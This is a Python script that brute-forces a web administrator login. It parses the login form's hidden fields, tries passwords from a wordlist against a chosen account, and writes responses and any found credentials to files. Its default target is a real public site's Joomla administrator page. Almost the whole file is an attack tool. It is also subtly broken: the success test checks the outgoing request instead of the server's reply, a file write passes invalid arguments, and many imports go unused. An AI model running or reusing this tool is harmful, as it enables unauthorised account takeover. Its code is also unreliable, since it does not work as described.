import socket
import urllib.request
from urllib.parse import urlparse
from urllib.request import urlopen
import queue
import os 
import sys
import paramiko
import threading
from struct import *
from ctypes import *
import time
from http.cookiejar import CookieJar
import win32com.client #Use the following command to install this module: => python -m pip install pywin32
from netaddr import IPNetwork, IPAddress #Use the following command to install this module: => pip install netaddr to install this
from html.parser import HTMLParser
import http.server
import socketserver
import fnmatch
import random
import zlib
import base64
AdminPrivelege = "https://192.168.112.131"

#For HTML Brute Forcing HTML form elements
class BruteParser(HTMLParser):
    def __init__(self):
        HTMLParser.__init__(self)
        self.tag_results = {}

    def handle_starttag(self, tag, attrs):
        if tag == "input":
            tag_name = None 
            tag_value = None
            for name,value in attrs:
                if name == "name":
                    tag_name = value 
                if name == "value":
                    tag_value = value
            if tag_name is not None:
                self.tag_results[tag_name] = value 


#This technique brute forces a set user account on a web server
#by accessing the from elements associated with user login, modifying
#and attempting user login via a wordlist to test against the account in question

#REQUIRED INFORMATION WHEN USING THIS PROGRAM:
    #Inspect the web server's login page elements
    #Find the administrator/form elements related to user login
    #Secure your wordlist to use for the program

#Define the Target, account, username, and password for brute forcing along with any other main elements for brute forcing
TargetUrl = "https://www.joomla.org/administrator/" #input("Enter the URL target: => ") 
UserAccount = input("Enter the username/email associated with the desired account: => ")
UserNameFormElement = input("Enter the name of the username form element associated with login: => ")
PasswordFormElement = input("Enter the name of the password form element associated with login: => ")
#https://www.joomla.org/administrator/
success_check = "Administration - Control Panel"
#success_check = "Username and password do not match or you do not have an account"

#Read in wordlist in binary mode 
WordList = open("RBWordList.txt", 'rb')
ReadWordList = WordList.readlines()
WordList.close()

#Build the Thread Stafe Stack 
ThreadStack = queue.Queue()

#Open the file to store all Information from attempted login url requests
CookieData = open('CookieData.txt', 'w')
Credentials = open('Credentials.txt', 'w')
LoginAttemptData = open('LoginAttemptData.txt', 'w')

#Loop through all the contents of the the text file bytes read, and removes trailing characters
#And place the the contents of the wordlist into the thread safe stack 
for Contents in ReadWordList:

    Contents = Contents.rstrip()
    
    #Decide how information is put into the thread safe stack
    if Contents == None:
        print("Nothing found, Resuming Wordlist")
    
    else:
        ThreadStack.put(Contents)

#Create a variable to hold password attempts   
Passwd = ThreadStack #The password is equal to the contents stored in the 

#Begin 
while not Passwd.empty() and not False:
    #Get the path of the path of the contents of the wordlist file stored in the stack
    PasswdAttempt = Passwd.get().rstrip()
    
    #Get all the cookies and build the cookie jar
    jar = http.cookiejar.FileCookieJar("cookies")
    opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))
    #Perform the Request to the web server using the cookie jar opener 
    #This is needed when making a login attempt
    response = opener.open(TargetUrl)
    pageResponse = response.read()

    #Record the Response 
    CookieData.write(str(pageResponse))

    #Begin parsing out the hidden fields 
    
    parser = BruteParser()
    parser.feed(str(pageResponse))

    post_tags = parser.tag_results

    #add our username and Password attempt to our Dictionary
    #This dictionary is overwritten each itteration of the loop 
    post_tags[UserNameFormElement] = UserAccount
    post_tags[PasswordFormElement] = PasswdAttempt
    
    #Encode the tags and begin the login attempt using our dictinoary
    login_data = urllib.parse.urlencode(post_tags)
    EncodeData = bytes(login_data, "utf-8")
    login_response = opener.open(TargetUrl, EncodeData)
    

    login_result = login_response.read()

    #Record the attempt
    print("Login attempt being made....")
    print("")
    print("Username: => ", UserAccount)
    print("BruteForce Value: => ", PasswdAttempt)
    print("Password : => ", Passwd.qsize())
    #print("Login Result: => ", login_result)

    LoginAttemptData.write(str(login_result))


    if success_check in login_data:
        print("BruteForce Successful!!!!")
        print("Username: => ", UserAccount)
        print("Password: => ", PasswdAttempt)

        Credentials.write("BruteForce Successful!!!!")
        Credentials.write("Username: => ", UserAccount)
        Credentials.write("Password: => ", PasswdAttempt)
        break
    
    else:
        print("Beggining Next Attempt....")

CookieData.close()
Credentials.close()
LoginAttemptData.close()
EndProg = input("Hit enter to exit")


